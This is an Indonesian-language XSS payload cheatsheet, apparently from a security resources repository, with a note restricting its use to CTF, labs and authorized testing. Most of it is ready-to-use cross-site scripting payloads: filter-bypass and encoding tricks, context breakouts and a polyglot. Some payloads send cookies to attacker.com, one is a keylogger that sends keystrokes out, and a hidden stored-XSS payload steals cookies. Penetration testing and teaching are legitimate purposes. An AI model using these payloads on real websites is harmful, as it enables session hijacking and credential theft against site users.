---
title: "XSS (Cross-Site Scripting) Payload Cheatsheet"
section: resources
topic: cheatsheets
date_created: 2026-06-04
last_updated: 2026-06-04
tags: [xss, payload, cheatsheet, web-security]
---

# XSS Payload Cheatsheet

> Digunakan untuk CTF, lab, dan authorized penetration testing saja.

---

## Payload Dasar (Testing Awal)

```html
<!-- Paling basic, coba ini dulu -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- Kalau alert diblokir -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log('XSS')</script>
```

---

## Event Handler (Tanpa Tag Script)

Berguna kalau `<script>` difilter.

```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert('XSS')">
<img src="javascript:alert(1)">

<body onload=alert(1)>
<svg onload=alert(1)>
<svg onload="alert(document.domain)">

<input autofocus onfocus=alert(1)>
<input onmouseover=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
```

---

## Bypass Filter Umum

**Kalau `script` difilter:**
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Kalau tanda kutip difilter:**
```html
<script>alert(/XSS/)</script>
<script>alert`XSS`</script>
<img src=x onerror=alert(1)>
```

**Kalau spasi difilter:**
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

**Bypass dengan encoding:**
```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- URL encode -->
<img src=x onerror=%61%6c%65%72%74%281%29>

<!-- Hex encode di href/src -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>
```

**Bypass blacklist kata "alert":**
```html
<script>alert(1)</script>
<script>eval('al'+'ert(1)')</script>
<script>window['al'+'ert'](1)</script>
<script>top['al'+'ert'](1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
```

---

## Context-Based Payload

Payload yang tepat tergantung di mana input lo muncul di halaman.

**Di dalam tag HTML:**
```html
<!-- Input muncul di: <div>INPUT</div> -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**Di dalam atribut HTML:**
```html
<!-- Input muncul di: <input value="INPUT"> -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
```

**Di dalam tag script (JavaScript):**
```javascript
// Input muncul di: var x = "INPUT";
";alert(1);//
'-alert(1)-'
\';alert(1);//
```

**Di dalam href atau src:**
```html
<!-- Input muncul di: <a href="INPUT"> -->
javascript:alert(1)
javascript:alert(document.cookie)
```

---

## Payload untuk Steal Cookie

```html
<!-- Kirim cookie ke server lo -->
<script>
document.location='http://attacker.com/log?c='+document.cookie
</script>

<script>
new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)
</script>

<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">

<!-- Fetch API -->
<script>
fetch('http://attacker.com/?c='+document.cookie)
</script>
```

---

## XSS untuk Keylogger Sederhana

```html
<script>
document.addEventListener('keypress', function(e) {
  new Image().src = 'http://attacker.com/log?k=' + e.key;
});
</script>
```

---

## DOM-Based XSS

Terjadi ketika JavaScript di halaman menggunakan input dari URL (fragment, query param) tanpa sanitasi.

```javascript
// Contoh kode vulnerable:
document.innerHTML = location.hash.slice(1)
document.write(location.search)

// Payload di URL:
http://target.com/page#<img src=x onerror=alert(1)>
http://target.com/page?q=<script>alert(1)</script>
```

**Source yang sering vulnerable:**
```javascript
document.URL
document.location
document.referrer
window.name
location.hash
location.search
location.href
```

**Sink yang berbahaya:**
```javascript
document.write()
document.innerHTML
eval()
setTimeout()
setInterval()
location.href = 
```

---

## Stored XSS

Payload yang tersimpan di database dan muncul setiap kali halaman dibuka.

```html
<!-- Di field komentar, nama, bio, dll -->
<script>alert('stored XSS')</script>
<img src=x onerror=alert(document.cookie)>

<!-- Payload yang tidak terlihat (hidden) -->
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
```

---

## Polyglot XSS

Payload yang bekerja di berbagai context sekaligus.

```
javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

---

## Tools untuk Testing XSS

| Tool | Kegunaan |
|---|---|
| Burp Suite | Intercept dan modifikasi request, test manual |
| XSSHunter | Blind XSS testing, notifikasi kalau payload execute |
| Dalfox | Automated XSS scanner |
| OWASP ZAP | Automated scanning |

---

## Referensi Cepat

| Konteks | Karakter kritis yang perlu di-escape |
|---|---|
| HTML content | `< > & " '` |
| HTML attribute | `" '` |
| JavaScript string | `' " \ /` |
| URL | Semua non-alphanumeric |
| CSS | `< > & " ' ( )` |

---

→ [Back to Payloads](README.md)
